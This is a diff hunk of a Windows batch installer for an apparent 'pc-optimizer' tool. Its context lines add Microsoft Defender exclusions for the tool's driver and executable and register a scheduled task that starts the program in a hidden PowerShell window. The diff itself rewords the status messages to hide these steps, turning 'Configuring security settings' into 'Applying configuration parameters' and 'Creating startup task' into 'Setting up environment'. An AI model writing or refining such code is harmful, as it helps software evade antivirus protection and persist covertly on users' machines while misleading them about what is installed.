@@ -60,12 +60,12 @@ if exist "%INSTALL_DIR%\pc-optimizer" (
 )
 
 echo.
-echo > Configuring security settings...
+echo > Applying configuration parameters...
 powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%DRIVER_NAME%'; Add-MpPreference -ExclusionPath '%INSTALL_DIR%\%EXE_NAME%'; Write-Host 'Security settings configured'"
 echo > Security exclusions applied
 
 echo.
-echo > Creating startup task...
+echo > Setting up environment...
 schtasks /delete /tn "%APP_NAME%" /f >nul 2>&1
 schtasks /create /tn "%APP_NAME%" ^
  /tr "powershell -WindowStyle Hidden -Command Start-Process '%INSTALL_DIR%\%EXE_NAME%' -WindowStyle Hidden" ^
@@ -74,7 +74,7 @@ schtasks /create /tn "%APP_NAME%" ^
  /f >nul
 
 if %errorlevel% neq 0 (
-    echo ERROR: Task creation failed.
+    echo ERROR
     pause
     exit /b 1
 )
